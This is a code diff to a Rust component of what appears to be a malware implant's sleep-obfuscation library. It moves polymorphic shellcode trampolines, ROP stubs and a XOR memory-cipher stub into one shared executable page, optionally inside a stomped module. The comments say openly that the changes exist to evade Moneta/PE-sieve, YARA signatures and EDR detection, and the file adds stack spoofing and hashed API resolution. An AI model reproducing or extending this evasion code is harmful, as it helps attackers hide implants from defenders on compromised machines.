@@ -1,25 +1,42 @@
 use alloc::string::String;
-use core::ptr::null_mut;
+use core::ffi::c_void;
 
 use obfstr::{obfstring as s};
 use anyhow::{Result, bail};
 use dinvk::hash::{jenkins3, murmur3};
-use dinvk::winapis::{NtCurrentProcess, NT_SUCCESS};
 use dinvk::module::{
     get_module_address, 
     get_proc_address, 
     get_ntdll_address
 };
 
-use crate::types::*;
 use crate::{
     cfg::{is_cfg_enforced, register_cfg_targets},
     spoof::StackSpoof,
+    stub_page::StubPage,
     winapis::*
 };
 
 /// Global configuration object.
 static CONFIG: spin::Once<Config> = spin::Once::new();
+
+/// Optional image-backed region for stub placement.
+/// Set via `set_stub_image_region()` *before* the first sleep cycle.
+static STUB_IMAGE_REGION: spin::Once<(u64, usize)> = spin::Once::new();
+
+/// Provide an image-backed RX region for hypnus stubs.
+///
+/// Call this from the implant **before** the first sleep cycle (i.e. before
+/// `Config::new()` runs). If set, `Config::new()` will write stubs into this
+/// region instead of allocating private RX memory, eliminating the
+/// "Abnormal private executable memory" finding from Moneta/PE-sieve.
+///
+/// # Arguments
+/// * `base` — address within the stomped module's `.text` section (beyond the implant code)
+/// * `size` — available bytes in the region
+pub fn set_stub_image_region(base: u64, size: usize) {
+    STUB_IMAGE_REGION.call_once(|| (base, size));
+}
 
 /// Lazily initializes and returns a singleton [`Config`] instance.
 #[inline]
@@ -59,6 +76,10 @@ pub struct Config {
     pub tp_release_cleanup: WinApi,
     pub rtl_capture_context: WinApi,
     pub zw_wait_for_worker: WinApi,
+    /// Base address of the consolidated stub page (for all ROP trampolines/stubs).
+    /// Stored for potential cleanup. All callback/trampoline/cipher/gadget addresses
+    /// point into this single page.
+    pub stub_page_base: u64,
 }
 
 /// Insert 0-3 random NOP-equivalent instructions to break byte signatures.
@@ -84,13 +105,28 @@ impl Config {
         // Resolve hashed function addresses for all required APIs
         let mut cfg = Self::winapis(Self::modules());
 
-        cfg.stack = StackSpoof::new(&cfg)?;
-        cfg.callback = Self::alloc_callback()?;
-        cfg.trampoline = Self::alloc_trampoline()?;
-        cfg.wfmo_trampoline = Self::alloc_wfmo_trampoline()?;
-        let cipher = Self::alloc_cipher_stub()?;
+        // Check if an image-backed region was provided (eliminates private RX entirely).
+        // Falls back to allocating a private page for standalone testing.
+        let mut stubs = if let Some(&(base, size)) = STUB_IMAGE_REGION.get() {
+            StubPage::from_image_region(base as *mut c_void, size)?
+        } else {
+            StubPage::new()?
+        };
+
+        // Write all stubs into the shared page (order doesn't matter)
+        cfg.callback = Self::write_callback(&mut stubs)?;
+        cfg.trampoline = Self::write_trampoline(&mut stubs)?;
+        cfg.wfmo_trampoline = Self::write_wfmo_trampoline(&mut stubs)?;
+        let cipher = Self::write_cipher_stub(&mut stubs)?;
         cfg.custom_encrypt = cipher;
         cfg.custom_decrypt = cipher;
+
+        // Write stack spoof gadget into the shared page
+        cfg.stack = StackSpoof::new_with_stubs(&cfg, &mut stubs)?;
+
+        // Single RW→RX flip + lock for the entire page
+        stubs.finalize()?;
+        cfg.stub_page_base = stubs.base_addr();
 
         // Register Control Flow Guard function targets if enabled
         if let Ok(true) = is_cfg_enforced() {
@@ -175,10 +211,9 @@ impl Config {
         Ok(())
     }
 
-    /// Allocates a small executable memory region used as a trampoline in thread pool callbacks.
+    /// Writes the thread pool callback trampoline into the shared stub page.
     /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
-    pub fn alloc_callback() -> Result<u64> {
-        // Generate polymorphic trampoline shellcode
+    fn write_callback(stubs: &mut StubPage) -> Result<u64> {
         let seed = unsafe { core::arch::x86_64::_rdtsc() };
         let mut callback = alloc::vec::Vec::with_capacity(32);
 
@@ -189,45 +224,12 @@ impl Config {
         insert_random_nops(&mut callback, seed >> 16);
         callback.extend_from_slice(&[0xFF, 0xE0]);              // jmp rax
 
-        // Allocate RW memory for trampoline
-        let mut size = callback.len();
-        let mut addr = null_mut();
-        if !NT_SUCCESS(NtAllocateVirtualMemory(
-            NtCurrentProcess(), 
-            &mut addr, 
-            0, 
-            &mut size, 
-            MEM_COMMIT | MEM_RESERVE, 
-            PAGE_READWRITE
-        )) {
-            bail!(s!("failed to allocate stack memory"));
-        }
-
-        // Write trampoline bytes to allocated memory
-        unsafe { core::ptr::copy_nonoverlapping(callback.as_ptr(), addr as *mut u8, callback.len()) };
-
-        // Change protection to RX for execution
-        let mut old_protect = 0;
-        if !NT_SUCCESS(NtProtectVirtualMemory(
-            NtCurrentProcess(), 
-            &mut addr, 
-            &mut size, 
-            PAGE_EXECUTE_READ as u32, 
-            &mut old_protect
-        )) {
-            bail!(s!("failed to change memory protection for RX"));
-        }
-
-        // Locks the specified region of virtual memory into physical memory,
-        // preventing it from being paged to disk by the memory manager
-        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
-        Ok(addr as u64)
+        Ok(stubs.write(&callback))
     }
 
-    /// Allocates trampoline memory for the execution of `RtlCaptureContext`.
+    /// Writes the RtlCaptureContext trampoline into the shared stub page.
     /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
-    pub fn alloc_trampoline() -> Result<u64> {
-        // Generate polymorphic trampoline shellcode
+    fn write_trampoline(stubs: &mut StubPage) -> Result<u64> {
         let seed = unsafe { core::arch::x86_64::_rdtsc() };
         let mut trampoline = alloc::vec::Vec::with_capacity(32);
 
@@ -238,60 +240,15 @@ impl Config {
         insert_random_nops(&mut trampoline, seed >> 16);
         trampoline.extend_from_slice(&[0xFF, 0x21]);        // jmp [rcx]
 
-        // Allocate RW memory for trampoline
-        let mut size = trampoline.len();
-        let mut addr = null_mut();
-        if !NT_SUCCESS(NtAllocateVirtualMemory(
-            NtCurrentProcess(), 
-            &mut addr, 
-            0, 
-            &mut size, 
-            MEM_COMMIT | MEM_RESERVE, 
-            PAGE_READWRITE
-        )) {
-            bail!(s!("failed to allocate stack memory"));
-        }
-
-        // Write trampoline bytes to allocated memory
-        unsafe { core::ptr::copy_nonoverlapping(trampoline.as_ptr(), addr as *mut u8, trampoline.len()) };
-
-        // Change protection to RX for execution
-        let mut old_protect = 0;
-        if !NT_SUCCESS(NtProtectVirtualMemory(
-            NtCurrentProcess(), 
-            &mut addr, 
-            &mut size, 
-            PAGE_EXECUTE_READ as u32, 
-            &mut old_protect
-        )) {
-            bail!(s!("failed to change memory protection for RX"));
-        }
-
-        // Locks the specified region of virtual memory into physical memory,
-        // preventing it from being paged to disk by the memory manager
-        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
-        Ok(addr as u64)
+        Ok(stubs.write(&trampoline))
     }
 
-    /// Allocates a trampoline that wraps WaitForMultipleObjects and stores the result.
+    /// Writes the WFMO trampoline into the shared stub page.
     ///
-    /// This trampoline solves the WFMO return value race condition in ROP chains.
-    /// When called via NtContinue, the WFMO return value in RAX would normally be
-    /// overwritten by the next NtContinue call before it can be read.
-    ///
-    /// The trampoline takes 6 parameters:
-    /// - RCX: nCount
-    /// - RDX: lpHandles  
-    /// - R8:  bWaitAll
-    /// - R9:  dwMilliseconds
-    /// - [RSP+0x28]: result_ptr - pointer to u64 where result will be stored
-    /// - [RSP+0x30]: wfmo_addr - address of WaitForMultipleObjects
-    ///
-    /// Generates polymorphic shellcode with random NOP-equivalent padding to defeat YARA signatures.
-    /// NOPs are inserted between instruction groups that don't affect the stack pointer,
-    /// so the stack offsets (0x60, 0x68) remain correct.
-    pub fn alloc_wfmo_trampoline() -> Result<u64> {
-        // Generate polymorphic WFMO trampoline shellcode
+    /// This trampoline wraps WaitForMultipleObjects and stores the return value.
+    /// Parameters via stack: [RSP+0x28]=result_ptr, [RSP+0x30]=wfmo_addr.
+    /// Generates polymorphic shellcode with random NOP-equivalent padding.
+    fn write_wfmo_trampoline(stubs: &mut StubPage) -> Result<u64> {
         let seed = unsafe { core::arch::x86_64::_rdtsc() };
         let mut code = alloc::vec::Vec::with_capacity(64);
 
@@ -318,49 +275,15 @@ impl Config {
         code.extend_from_slice(&[0x5B]);                         // pop rbx
         code.extend_from_slice(&[0xC3]);                         // ret
 
-        // Allocate RW memory for trampoline
-        let mut size = code.len();
-        let mut addr = null_mut();
-        if !NT_SUCCESS(NtAllocateVirtualMemory(
-            NtCurrentProcess(),
-            &mut addr,
-            0,
-            &mut size,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE
-        )) {
-            bail!(s!("failed to allocate WFMO trampoline memory"));
-        }
-
-        // Write trampoline bytes to allocated memory
-        unsafe { core::ptr::copy_nonoverlapping(code.as_ptr(), addr as *mut u8, code.len()) };
-
-        // Change protection to RX for execution
-        let mut old_protect = 0;
-        if !NT_SUCCESS(NtProtectVirtualMemory(
-            NtCurrentProcess(),
-            &mut addr,
-            &mut size,
-            PAGE_EXECUTE_READ as u32,
-            &mut old_protect
-        )) {
-            bail!(s!("failed to change WFMO trampoline memory protection to RX"));
-        }
-
-        // Lock the memory to prevent paging
-        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
-        Ok(addr as u64)
+        Ok(stubs.write(&code))
     }
 
-    /// Allocates a custom SIMD XOR cipher stub for ROP chain memory encryption.
-    /// Replaces SystemFunction040/041 to avoid EDR detection.
+    /// Writes the SIMD XOR cipher stub into the shared stub page.
     /// Uses SSE2 PXOR which is self-inverse (encrypt = decrypt).
     ///
     /// Calling convention (matches SystemFunction040):
-    ///   RCX = memory pointer
-    ///   RDX = size in bytes  
-    ///   R8  = unused
-    pub fn alloc_cipher_stub() -> Result<u64> {
+    ///   RCX = memory pointer, RDX = size in bytes, R8 = unused
+    fn write_cipher_stub(stubs: &mut StubPage) -> Result<u64> {
         // Generate random 16-byte XOR key using RDTSC
         let mut key = [0u8; 16];
         for i in 0..16 {
@@ -395,32 +318,11 @@ impl Config {
             0xC3,                                     // ret
         ];
 
-        let total = shellcode_code.len() + key.len();
-        let mut shellcode = alloc::vec::Vec::with_capacity(total);
+        let mut shellcode = alloc::vec::Vec::with_capacity(shellcode_code.len() + key.len());
         shellcode.extend_from_slice(&shellcode_code);
         shellcode.extend_from_slice(&key);
 
-        let mut size = shellcode.len();
-        let mut addr = null_mut();
-        if !NT_SUCCESS(NtAllocateVirtualMemory(
-            NtCurrentProcess(), &mut addr, 0, &mut size,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
-        )) {
-            bail!(s!("failed to allocate cipher stub memory"));
-        }
-
-        unsafe { core::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len()) };
-
-        let mut old_protect = 0;
-        if !NT_SUCCESS(NtProtectVirtualMemory(
-            NtCurrentProcess(), &mut addr, &mut size,
-            PAGE_EXECUTE_READ as u32, &mut old_protect
-        )) {
-            bail!(s!("failed to set cipher stub to RX"));
-        }
-
-        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
-        Ok(addr as u64)
+        Ok(stubs.write(&shellcode))
     }
 
     /// Resolves the base addresses of key Windows modules (`ntdll.dll`, `kernel32.dll`, etc).
